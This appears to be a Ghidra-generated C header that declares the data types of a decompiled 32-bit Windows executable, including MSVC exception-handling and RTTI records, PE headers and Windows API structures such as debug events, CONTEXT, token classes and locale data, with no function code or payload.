typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef unsigned int    ImageBaseOffset32;
typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
float10
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    void * pVFTable;
    void * spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor * pType;
    ptrdiff_t dispCatchObj;
    void * addressOfHandler;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

typedef int __ehstate_t;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType * pHandlerArray;
};

typedef struct _s__RTTIClassHierarchyDescriptor _s__RTTIClassHierarchyDescriptor, *P_s__RTTIClassHierarchyDescriptor;

typedef struct _s__RTTIBaseClassDescriptor _s__RTTIBaseClassDescriptor, *P_s__RTTIBaseClassDescriptor;

typedef struct _s__RTTIBaseClassDescriptor RTTIBaseClassDescriptor;

typedef struct PMD PMD, *PPMD;

typedef struct _s__RTTIClassHierarchyDescriptor RTTIClassHierarchyDescriptor;

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s__RTTIBaseClassDescriptor {
    struct TypeDescriptor * pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    dword numContainedBases; // count of extended classes in BaseClassArray (RTTI 2)
    struct PMD where; // member displacement structure
    dword attributes; // bit flags
    RTTIClassHierarchyDescriptor * pClassHierarchyDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3) for class
};

struct _s__RTTIClassHierarchyDescriptor {
    dword signature;
    dword attributes; // bit flags
    dword numBaseClasses; // number of base classes (i.e. rtti1Count)
    RTTIBaseClassDescriptor * * pBaseClassArray; // ref to BaseClassArray (RTTI 2)
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Class Structure
};

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (* action)(void);
};

typedef struct _s__RTTICompleteObjectLocator _s__RTTICompleteObjectLocator, *P_s__RTTICompleteObjectLocator;

struct _s__RTTICompleteObjectLocator {
    dword signature;
    dword offset; // offset of vbtable within class
    dword cdOffset; // constructor displacement offset
    struct TypeDescriptor * pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    RTTIClassHierarchyDescriptor * pClassDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3)
};

typedef unsigned short    wchar16;
typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef struct _s_ESTypeList _s_ESTypeList, *P_s_ESTypeList;

struct _s_ESTypeList {
    int nCount;
    HandlerType * pTypeArray;
};

typedef struct _s_ESTypeList ESTypeList;

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry * pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry * pTryBlockMap;
    uint nIPMapEntries;
    void * pIPToStateMap;
    ESTypeList * pESTypeList;
    int EHFlags;
};

typedef struct _s__RTTICompleteObjectLocator RTTICompleteObjectLocator;

typedef struct _cpinfo _cpinfo, *P_cpinfo;

typedef uint UINT;

typedef uchar BYTE;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo * LPCPINFO;

typedef struct _EXIT_PROCESS_DEBUG_INFO _EXIT_PROCESS_DEBUG_INFO, *P_EXIT_PROCESS_DEBUG_INFO;

typedef struct _EXIT_PROCESS_DEBUG_INFO EXIT_PROCESS_DEBUG_INFO;

typedef ulong DWORD;

struct _EXIT_PROCESS_DEBUG_INFO {
    DWORD dwExitCode;
};

typedef struct _SYSTEM_INFO _SYSTEM_INFO, *P_SYSTEM_INFO;

typedef union _union_530 _union_530, *P_union_530;

typedef void * LPVOID;

typedef ulong ULONG_PTR;

typedef ULONG_PTR DWORD_PTR;

typedef ushort WORD;

typedef struct _struct_531 _struct_531, *P_struct_531;

struct _struct_531 {
    WORD wProcessorArchitecture;
    WORD wReserved;
};

union _union_530 {
    DWORD dwOemId;
    struct _struct_531 s;
};

struct _SYSTEM_INFO {
    union _union_530 u;
    DWORD dwPageSize;
    LPVOID lpMinimumApplicationAddress;
    LPVOID lpMaximumApplicationAddress;
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
};

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef union _union_518 _union_518, *P_union_518;

typedef void * HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void * PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _CREATE_PROCESS_DEBUG_INFO _CREATE_PROCESS_DEBUG_INFO, *P_CREATE_PROCESS_DEBUG_INFO;

typedef DWORD (* PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

struct _CREATE_PROCESS_DEBUG_INFO {
    HANDLE hFile;
    HANDLE hProcess;
    HANDLE hThread;
    LPVOID lpBaseOfImage;
    DWORD dwDebugInfoFileOffset;
    DWORD nDebugInfoSize;
    LPVOID lpThreadLocalBase;
    LPTHREAD_START_ROUTINE lpStartAddress;
    LPVOID lpImageName;
    WORD fUnicode;
};

typedef struct _CREATE_THREAD_DEBUG_INFO _CREATE_THREAD_DEBUG_INFO, *P_CREATE_THREAD_DEBUG_INFO;

struct _CREATE_THREAD_DEBUG_INFO {
    HANDLE hThread;
    LPVOID lpThreadLocalBase;
    LPTHREAD_START_ROUTINE lpStartAddress;
};

typedef struct _EXCEPTION_DEBUG_INFO _EXCEPTION_DEBUG_INFO, *P_EXCEPTION_DEBUG_INFO;

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD * ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_DEBUG_INFO {
    EXCEPTION_RECORD ExceptionRecord;
    DWORD dwFirstChance;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _OUTPUT_DEBUG_STRING_INFO _OUTPUT_DEBUG_STRING_INFO, *P_OUTPUT_DEBUG_STRING_INFO;

typedef struct _OUTPUT_DEBUG_STRING_INFO OUTPUT_DEBUG_STRING_INFO;

typedef char CHAR;

typedef CHAR * LPSTR;

struct _OUTPUT_DEBUG_STRING_INFO {
    LPSTR lpDebugStringData;
    WORD fUnicode;
    WORD nDebugStringLength;
};

typedef struct _LOAD_DLL_DEBUG_INFO _LOAD_DLL_DEBUG_INFO, *P_LOAD_DLL_DEBUG_INFO;

struct _LOAD_DLL_DEBUG_INFO {
    HANDLE hFile;
    LPVOID lpBaseOfDll;
    DWORD dwDebugInfoFileOffset;
    DWORD nDebugInfoSize;
    LPVOID lpImageName;
    WORD fUnicode;
};

typedef struct _EXIT_THREAD_DEBUG_INFO _EXIT_THREAD_DEBUG_INFO, *P_EXIT_THREAD_DEBUG_INFO;

struct _EXIT_THREAD_DEBUG_INFO {
    DWORD dwExitCode;
};

typedef struct _RIP_INFO _RIP_INFO, *P_RIP_INFO;

typedef struct _RIP_INFO RIP_INFO;

struct _RIP_INFO {
    DWORD dwError;
    DWORD dwType;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef struct _SECURITY_ATTRIBUTES * LPSECURITY_ATTRIBUTES;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _DEBUG_EVENT _DEBUG_EVENT, *P_DEBUG_EVENT;

typedef struct _DEBUG_EVENT * LPDEBUG_EVENT;

typedef union _union_543 _union_543, *P_union_543;

typedef struct _EXCEPTION_DEBUG_INFO EXCEPTION_DEBUG_INFO;

typedef struct _CREATE_THREAD_DEBUG_INFO CREATE_THREAD_DEBUG_INFO;

typedef struct _CREATE_PROCESS_DEBUG_INFO CREATE_PROCESS_DEBUG_INFO;

typedef struct _EXIT_THREAD_DEBUG_INFO EXIT_THREAD_DEBUG_INFO;

typedef struct _LOAD_DLL_DEBUG_INFO LOAD_DLL_DEBUG_INFO;

typedef struct _UNLOAD_DLL_DEBUG_INFO _UNLOAD_DLL_DEBUG_INFO, *P_UNLOAD_DLL_DEBUG_INFO;

typedef struct _UNLOAD_DLL_DEBUG_INFO UNLOAD_DLL_DEBUG_INFO;

struct _UNLOAD_DLL_DEBUG_INFO {
    LPVOID lpBaseOfDll;
};

union _union_543 {
    EXCEPTION_DEBUG_INFO Exception;
    CREATE_THREAD_DEBUG_INFO CreateThread;
    CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;
    EXIT_THREAD_DEBUG_INFO ExitThread;
    EXIT_PROCESS_DEBUG_INFO ExitProcess;
    LOAD_DLL_DEBUG_INFO LoadDll;
    UNLOAD_DLL_DEBUG_INFO UnloadDll;
    OUTPUT_DEBUG_STRING_INFO DebugString;
    RIP_INFO RipInfo;
};

struct _DEBUG_EVENT {
    DWORD dwDebugEventCode;
    DWORD dwProcessId;
    DWORD dwThreadId;
    union _union_543 u;
};

typedef enum _GET_FILEEX_INFO_LEVELS {
    GetFileExInfoStandard=0,
    GetFileExMaxInfoLevel=1
} _GET_FILEEX_INFO_LEVELS;

typedef enum _GET_FILEEX_INFO_LEVELS GET_FILEEX_INFO_LEVELS;

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

typedef struct _PROCESS_INFORMATION * LPPROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT * PCONTEXT;

typedef PCONTEXT LPCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef long LONG;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (* PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef EXCEPTION_RECORD * PEXCEPTION_RECORD;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SYSTEM_INFO * LPSYSTEM_INFO;

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef wchar_t WCHAR;

typedef WCHAR * LPWSTR;

typedef BYTE * LPBYTE;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW * LPSTARTUPINFOW;

typedef enum _COMPUTER_NAME_FORMAT {
    ComputerNameNetBIOS=0,
    ComputerNameDnsHostname=1,
    ComputerNameDnsDomain=2,
    ComputerNameDnsFullyQualified=3,
    ComputerNamePhysicalNetBIOS=4,
    ComputerNamePhysicalDnsHostname=5,
    ComputerNamePhysicalDnsDomain=6,
    ComputerNamePhysicalDnsFullyQualified=7,
    ComputerNameMax=8
} _COMPUTER_NAME_FORMAT;

typedef struct _OVERLAPPED * LPOVERLAPPED;

typedef BYTE BOOLEAN;

typedef void (* WAITORTIMERCALLBACKFUNC)(PVOID, BOOLEAN);

typedef WAITORTIMERCALLBACKFUNC WAITORTIMERCALLBACK;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION * PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG * PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * Flink;
    struct _LIST_ENTRY * Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION * CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef enum _COMPUTER_NAME_FORMAT COMPUTER_NAME_FORMAT;

typedef struct _SYSTEMTIME * LPSYSTEMTIME;

typedef WCHAR OLECHAR;

typedef OLECHAR * LPOLESTR;

typedef struct DotNetPdbInfo DotNetPdbInfo, *PDotNetPdbInfo;

struct DotNetPdbInfo {
    char signature[4];
    GUID guid;
    dword age;
    char pdbname[31];
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char * _ptr;
    int _cnt;
    char * _base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char * _tmpfname;
};

typedef struct _iobuf FILE;

typedef char * va_list;

typedef uint uintptr_t;

typedef struct lconv lconv, *Plconv;

struct lconv {
    char * decimal_point;
    char * thousands_sep;
    char * grouping;
    char * int_curr_symbol;
    char * currency_symbol;
    char * mon_decimal_point;
    char * mon_thousands_sep;
    char * mon_grouping;
    char * positive_sign;
    char * negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t * _W_decimal_point;
    wchar_t * _W_thousands_sep;
    wchar_t * _W_int_curr_symbol;
    wchar_t * _W_currency_symbol;
    wchar_t * _W_mon_decimal_point;
    wchar_t * _W_mon_thousands_sep;
    wchar_t * _W_positive_sign;
    wchar_t * _W_negative_sign;
};

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct * pthreadlocinfo;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

struct localerefcount {
    char * locale;
    wchar_t * wlocale;
    int * refcount;
    int * wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int * lconv_intl_refcount;
    int * lconv_num_refcount;
    int * lconv_mon_refcount;
    struct lconv * lconv;
    int * ctype1_refcount;
    ushort * ctype1;
    ushort * pctype;
    uchar * pclmap;
    uchar * pcumap;
    struct __lc_time_data * lc_time_curr;
    wchar_t * locale_name[6];
};

struct __lc_time_data {
    char * wday_abbr[7];
    char * wday[7];
    char * month_abbr[12];
    char * month[12];
    char * ampm[2];
    char * ww_sdatefmt;
    char * ww_ldatefmt;
    char * ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t * _W_wday_abbr[7];
    wchar_t * _W_wday[7];
    wchar_t * _W_month_abbr[12];
    wchar_t * _W_month[12];
    wchar_t * _W_ampm[2];
    wchar_t * _W_ww_sdatefmt;
    wchar_t * _W_ww_ldatefmt;
    wchar_t * _W_ww_timefmt;
    wchar_t * _W_ww_locale_name;
};

typedef uint size_t;

typedef int errno_t;

typedef size_t rsize_t;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct * pthreadmbcinfo;

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t * mblocalename;
};

typedef struct tagMSG tagMSG, *PtagMSG;

typedef struct tagMSG MSG;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ * HWND;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef struct tagPOINT tagPOINT, *PtagPOINT;

typedef struct tagPOINT POINT;

struct tagPOINT {
    LONG x;
    LONG y;
};

struct tagMSG {
    HWND hwnd;
    UINT message;
    WPARAM wParam;
    LPARAM lParam;
    DWORD time;
    POINT pt;
};

struct HWND__ {
    int unused;
};

typedef BOOL (* WNDENUMPROC)(HWND, LPARAM);

typedef struct tagMSG * LPMSG;

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Class Structure
};

typedef struct _Generic_error_category _Generic_error_category, *P_Generic_error_category;

struct _Generic_error_category { // PlaceHolder Class Structure
};

typedef struct _Iostream_error_category _Iostream_error_category, *P_Iostream_error_category;

struct _Iostream_error_category { // PlaceHolder Class Structure
};

typedef struct _System_error_category _System_error_category, *P_System_error_category;

struct _System_error_category { // PlaceHolder Class Structure
};

typedef struct error_category error_category, *Perror_category;

struct error_category { // PlaceHolder Class Structure
};

typedef struct _devicemodeW _devicemodeW, *P_devicemodeW;

typedef union _union_660 _union_660, *P_union_660;

typedef union _union_663 _union_663, *P_union_663;

typedef struct _struct_661 _struct_661, *P_struct_661;

typedef struct _struct_662 _struct_662, *P_struct_662;

typedef struct _POINTL _POINTL, *P_POINTL;

typedef struct _POINTL POINTL;

struct _POINTL {
    LONG x;
    LONG y;
};

union _union_663 {
    DWORD dmDisplayFlags;
    DWORD dmNup;
};

struct _struct_662 {
    POINTL dmPosition;
    DWORD dmDisplayOrientation;
    DWORD dmDisplayFixedOutput;
};

struct _struct_661 {
    short dmOrientation;
    short dmPaperSize;
    short dmPaperLength;
    short dmPaperWidth;
    short dmScale;
    short dmCopies;
    short dmDefaultSource;
    short dmPrintQuality;
};

union _union_660 {
    struct _struct_661 field0;
    struct _struct_662 field1;
};

struct _devicemodeW {
    WCHAR dmDeviceName[32];
    WORD dmSpecVersion;
    WORD dmDriverVersion;
    WORD dmSize;
    WORD dmDriverExtra;
    DWORD dmFields;
    union _union_660 field6_0x4c;
    short dmColor;
    short dmDuplex;
    short dmYResolution;
    short dmTTOption;
    short dmCollate;
    WCHAR dmFormName[32];
    WORD dmLogPixels;
    DWORD dmBitsPerPel;
    DWORD dmPelsWidth;
    DWORD dmPelsHeight;
    union _union_663 field17_0xb4;
    DWORD dmDisplayFrequency;
    DWORD dmICMMethod;
    DWORD dmICMIntent;
    DWORD dmMediaType;
    DWORD dmDitherType;
    DWORD dmReserved1;
    DWORD dmReserved2;
    DWORD dmPanningWidth;
    DWORD dmPanningHeight;
};

typedef struct _devicemodeW DEVMODEW;


// WARNING! conflicting data type names: /guiddef.h/GUID - /GUID

typedef struct _GUID _GUID, *P_GUID;

struct _GUID {
    ulong Data1;
    ushort Data2;
    ushort Data3;
    uchar Data4[8];
};

typedef GUID UUID;

typedef long RPC_STATUS;

typedef struct _MEMORY_BASIC_INFORMATION _MEMORY_BASIC_INFORMATION, *P_MEMORY_BASIC_INFORMATION;

typedef ULONG_PTR SIZE_T;

struct _MEMORY_BASIC_INFORMATION {
    PVOID BaseAddress;
    PVOID AllocationBase;
    DWORD AllocationProtect;
    SIZE_T RegionSize;
    DWORD State;
    DWORD Protect;
    DWORD Type;
};

typedef PVOID PSECURITY_DESCRIPTOR;

typedef struct _OSVERSIONINFOEXW _OSVERSIONINFOEXW, *P_OSVERSIONINFOEXW;

struct _OSVERSIONINFOEXW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
    WORD wServicePackMajor;
    WORD wServicePackMinor;
    WORD wSuiteMask;
    BYTE wProductType;
    BYTE wReserved;
};

typedef struct _ACL _ACL, *P_ACL;

struct _ACL {
    BYTE AclRevision;
    BYTE Sbz1;
    WORD AclSize;
    WORD AceCount;
    WORD Sbz2;
};

typedef double ULONGLONG;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _OSVERSIONINFOEXW * LPOSVERSIONINFOEXW;

typedef struct _ACL ACL;

typedef ACL * PACL;

typedef WORD * PSECURITY_DESCRIPTOR_CONTROL;

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef struct _IMAGE_SECTION_HEADER * PIMAGE_SECTION_HEADER;

typedef DWORD SECURITY_INFORMATION;

typedef WCHAR * LPWCH;

typedef struct _SID_IDENTIFIER_AUTHORITY _SID_IDENTIFIER_AUTHORITY, *P_SID_IDENTIFIER_AUTHORITY;

typedef struct _SID_IDENTIFIER_AUTHORITY * PSID_IDENTIFIER_AUTHORITY;

struct _SID_IDENTIFIER_AUTHORITY {
    BYTE Value[6];
};

typedef WCHAR * LPCWSTR;

typedef enum _ACL_INFORMATION_CLASS {
    AclRevisionInformation=1,
    AclSizeInformation=2
} _ACL_INFORMATION_CLASS;

typedef enum _ACL_INFORMATION_CLASS ACL_INFORMATION_CLASS;

typedef long HRESULT;

typedef CHAR * LPCSTR;

typedef struct _MEMORY_BASIC_INFORMATION * PMEMORY_BASIC_INFORMATION;

typedef ULONGLONG DWORDLONG;

typedef LONG * PLONG;

typedef enum _TOKEN_INFORMATION_CLASS {
    TokenUser=1,
    TokenGroups=2,
    TokenPrivileges=3,
    TokenOwner=4,
    TokenPrimaryGroup=5,
    TokenDefaultDacl=6,
    TokenSource=7,
    TokenType=8,
    TokenImpersonationLevel=9,
    TokenStatistics=10,
    TokenRestrictedSids=11,
    TokenSessionId=12,
    TokenGroupsAndPrivileges=13,
    TokenSessionReference=14,
    TokenSandBoxInert=15,
    TokenAuditPolicy=16,
    TokenOrigin=17,
    TokenElevationType=18,
    TokenLinkedToken=19,
    TokenElevation=20,
    TokenHasRestrictions=21,
    TokenAccessInformation=22,
    TokenVirtualizationAllowed=23,
    TokenVirtualizationEnabled=24,
    TokenIntegrityLevel=25,
    TokenUIAccess=26,
    TokenMandatoryPolicy=27,
    TokenLogonSid=28,
    MaxTokenInfoClass=29
} _TOKEN_INFORMATION_CLASS;

typedef LARGE_INTEGER * PLARGE_INTEGER;

typedef PVOID PSID;

typedef WORD LANGID;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef enum _TOKEN_INFORMATION_CLASS TOKEN_INFORMATION_CLASS;

typedef HANDLE * PHANDLE;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ulong ULONG;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD * LPDWORD;

typedef DWORD * PDWORD;

typedef uint * PUINT;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME * PFILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ * HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef HANDLE HLOCAL;

typedef long * LPLONG;

typedef struct HDESK__ HDESK__, *PHDESK__;

struct HDESK__ {
    int unused;
};

typedef BOOL * PBOOL;

typedef struct _FILETIME * LPFILETIME;

typedef int (* FARPROC)(void);

typedef HANDLE * LPHANDLE;

typedef WORD * LPWORD;

typedef int INT;

typedef struct HKEY__ * HKEY;

typedef HKEY * PHKEY;

typedef struct HWINSTA__ HWINSTA__, *PHWINSTA__;

struct HWINSTA__ {
    int unused;
};

typedef struct HWINSTA__ * HWINSTA;

typedef LONG_PTR LRESULT;

typedef HANDLE HGLOBAL;

typedef BOOL * LPBOOL;

typedef BYTE * PBYTE;

typedef void * LPCVOID;

typedef uchar UCHAR;

typedef struct HRSRC__ * HRSRC;

typedef struct HDESK__ * HDESK;

